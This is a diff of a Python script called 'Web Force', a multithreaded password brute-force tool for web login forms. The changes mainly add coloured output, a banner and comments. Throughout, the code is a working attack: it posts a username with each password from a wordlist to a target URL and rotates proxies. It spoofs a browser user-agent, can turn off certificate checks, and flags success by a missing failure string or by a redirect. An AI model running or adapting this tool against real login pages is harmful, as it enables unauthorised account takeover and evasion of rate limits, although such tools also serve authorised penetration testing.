@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+
+#Importing Libraries
 import requests
 import argparse
 import threading
@@ -6,6 +8,9 @@ import time
 import sys
 import logging
 import random
+import shutil
+import pyfiglet
+#Building Arguments
 parser= argparse.ArgumentParser(description="Web Force is a web app password bruteforce tool")
 parser.add_argument('-t','--target',required=True,help="Provide Target Url")
 parser.add_argument('-u','--username',required=True,help="Provide Username")
@@ -23,29 +28,48 @@ parser.add_argument('--no-verify', action='store_true', help='Disable SSL certif
 parser.add_argument('--log', action='store_true', help='Enables logging to webforce.log')
 args= parser.parse_args()
 
-headers={'User-Agent':args.useragent}
-print(f"Target: {args.target} Set")
-print(f"Username: {args.username} Set")
-print(f"Path to wordlist: {args.wordlist} Set")
-print(f"String indicating failed attempt set as: {args.failed}")
-print(f"Username field: {args.usernamef}")
-print(f"Password field: {args.passwordf}")
-print(f"Request TimeOut in: {args.timeout}s")
-print(f"Number of threads utilizing: {args.threads}")
-print(f"Our user agent is: {args.useragent}")
+#Colors
+RED     = '\033[91m'
+GREEN   = '\033[92m'
+YELLOW  = '\033[93m'
+BLUE    = '\033[94m'
+MAGENTA = '\033[95m'
+CYAN    = '\033[96m'
+WHITE   = '\033[97m'
+RESET   = '\033[0m'
+BOLD    = '\033[1m'
 
+
+#Telling User
+headers={'User-Agent':args.useragent} # building a header with a legit browser user-agent
+print(f"{CYAN}Target: {BOLD}{args.target}{RESET}")
+print(f"{CYAN}Username: {BOLD}{args.username}{RESET}")
+print(f"{CYAN}Path to wordlist: {BOLD}{args.wordlist}{RESET}")
+print(f"{CYAN}String indicating failed attempt set as: {BOLD}{args.failed}{RESET}")
+print(f"{CYAN}Username field: {BOLD}{args.usernamef}{RESET}")
+print(f"{CYAN}Password field: {BOLD}{args.passwordf}{RESET}")
+print(f"{CYAN}Request TimeOut in: {BOLD}{args.timeout}s{RESET}")
+print(f"{CYAN}Number of threads utilizing: {BOLD}{args.threads}{RESET}")
+print(f"{CYAN}Our user agent is: {BOLD}{args.useragent}{RESET}")
+#Setting baisc Threading
 found = threading.Event()
 lock = threading.Lock()
 thread_local = threading.local()
-
+#Defining Functions
+def splash_screen():
+    term_width = shutil.get_terminal_size().columns
+    banner = pyfiglet.figlet_format("Web Force")
+    for line in banner.split('\n'):
+        print(line.center(term_width))
+#1. For proxies
 def load_proxies(proxylist):
     try:
         with open(proxylist) as file:
             return [line.strip() for line in file if line.strip()]
     except FileNotFoundError:
-        print("The given list of proxies does not exists.")
+        print(f"{RED}The given list of proxies does not exists.{RESET}")
         sys.exit(1)
-
+#2. For giving sessions to threads + giving proxies
 def get_session(proxies=None):
     if not hasattr(thread_local, "session"):
         session = requests.Session()
@@ -64,7 +88,7 @@ def get_session(proxies=None):
             }
         thread_local.session = session
     return thread_local.session
-
+#3. logging stuff
 def check_logging(log):
     if log:
         logging.basicConfig(
@@ -72,56 +96,57 @@ def check_logging(log):
             level=logging.INFO,
             format='%(asctime)s - %(levelname)s - %(message)s'
         )
-        print("[*] Logging is enabled. Output will be saved to 'webforce.log'")
+        print(f"{YELLOW}[*] Logging is enabled. Output will be saved to 'webforce.log'")
     else:
         logging.disable(logging.CRITICAL)
-        
+#4. password generator         
 def password_extract(wordlist):
     try:
         with open(wordlist,'r',encoding="latin-1") as file:
             for line in file:
                 yield line.strip()
     except FileNotFoundError:
-        print("The provided file path is not valid. Please Check Again")
-        exit(1)
-
+        print(f"{RED}The provided file path is not valid. Please Check Again{RESET}")
+        sys.exit(1)
+#5. main logic
 def attempt_login(password, proxies=None):
     if found.is_set():
         return
     session = get_session(proxies)
     data = {args.usernamef:args.username, args.passwordf:password}
     try:
-        response = session.post(args.target,data, timeout=args.timeout, allow_redirects=False, verify=not(args.no_verify))
-        if args.redirect:
+        response = session.post(args.target,data, timeout=args.timeout, allow_redirects=False, verify=not(args.no_verify)) #sending data getting response
+        if args.redirect: # checking if need for redirect check
                 location = response.headers.get("Location", "")
                 if args.redirect in location:
                     with lock:
-                        print(f"[+] Success! Password found: {password}")
+                        print(f"{GREEN}{BOLD}[+] Success! Password found: {WHITE}{password}{RESET}")
                         logging.info(f"Success! Password found: {password}")
                     found.set()
                 else:
                     with lock:
-                        print(f"[-] Tried: {password} - Failed")
+                        print(f"{BLUE}[-] Tried: {WHITE}{BOLD}{password} - {RESET}{RED}Failed{RESET}")
                         logging.info(f"Tried: {password} - Failed")
         else:
             if args.failed not in response.text:
                 with lock:
-                    print(f"[+] Success! Password found: {password}")
+                    print(f"{GREEN}{BOLD}[+] Success! Password found: {WHITE}{password}{RESET}")
                     logging.info(f"Success! Password found: {password}")
                 found.set()
             else:
                 with lock:
-                    print(f"[-] Tried: {password} - Failed")
+                    print(f"{BLUE}[-] Tried: {WHITE}{BOLD}{password} - {RESET}{RED}Failed{RESET}")
                     logging.info(f"Tried: {password} - Failed")
-    except requests.exceptions.RequestException as e:
+    except requests.exceptions.RequestException as e: # handling any request exception
         with lock:
-            print(f"An error occured {e}")
+            print(f"{MAGENTA}An error occured {e}{RESET}")
             logging.error(f"An request error occured {e}")
 
-
+# main function
 def main():
-        proxies = load_proxies(args.proxylist) if args.proxylist else None
-        print("BruteForce Starts!")
+        splash_screen()
+        proxies = load_proxies(args.proxylist) if args.proxylist else None #loading proxies if exists
+        print(f"{YELLOW}{BOLD}BruteForce Starts!{RESET}")
         check_logging(args.log)
         passwords=password_extract(args.wordlist)
 
@@ -145,17 +170,16 @@ def main():
                 t.join()
             
         if not found.is_set():
-            print("[-] Password not found in wordlist.")
+            print(f"{BOLD}[-] Password not found in wordlist.{RESET}")
             logging.info("Password not found in wordlist.")
             sys.exit(1)
         else:
             sys.exit(0)
-
+#handling keyboard interrupt
 try:
     main()
 except KeyboardInterrupt:
+    print(f"{BOLD}")
     print("\nWeb Force is terminated Successfully")
+    print(f"{RESET}")
     logging.error("Keyboard Interrupt")
-
-        
-            
